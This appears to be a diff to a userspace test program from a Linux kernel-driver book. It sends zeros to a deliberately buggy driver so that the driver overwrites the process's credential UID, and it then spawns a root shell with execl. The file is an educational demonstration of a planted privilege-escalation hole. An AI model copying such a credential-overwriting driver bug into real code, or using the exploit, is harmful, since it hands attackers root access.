@@ -17,6 +17,13 @@
  * from the driver within kernel-space. Equivalently, one can use the write(2)
  * change the 'secret' (just plain text).
  *
+ * NEW:
+ * This particular version differs from the earlier one in one regard: we have
+ * a macro HACKIT; if it's defined, this process will deliberately write only
+ * zero's into the userspace buffer and send that to our 'bad' driver's write
+ * method. If the driver has the DANGER_GETROOT_BUG macro defined, then it will
+ * write this into the process's UID member, thus making us root!
+ *
  * For details, please refer the book, Ch 9.
  */
 #include <stdio.h>
@@ -118,8 +125,9 @@ int main(int argc, char **argv)
 		strncpy(buf, argv[3], num);
 #else
 		printf("%s: attempting to get root ...\n", argv[0]);
-		/* Write 0's ... our 'bad' driver will write this into
-		 * current->cred->uid !  */
+		/* Write only 0's ... our 'bad' driver will write this into
+		 * this process's current->cred->uid member, thus making us
+		 * root ! */
 		memset(buf, 0, num);
 #endif
 		n = write(fd, buf, num);
@@ -132,7 +140,8 @@ int main(int argc, char **argv)
 		printf("%s: wrote %zu bytes to %s\n", argv[0], n, argv[2]);
 #ifdef HACKIT
 		if (getuid() == 0) {
-			printf(" !Pwned! uid=%d\n", getuid());
+			printf(" !Pwned! uid==%d\n", getuid());
+			/* the hacker's holy grail: spawn a root shell */
 			execl("/bin/sh", "sh", (char *)NULL);
 		}
 #endif
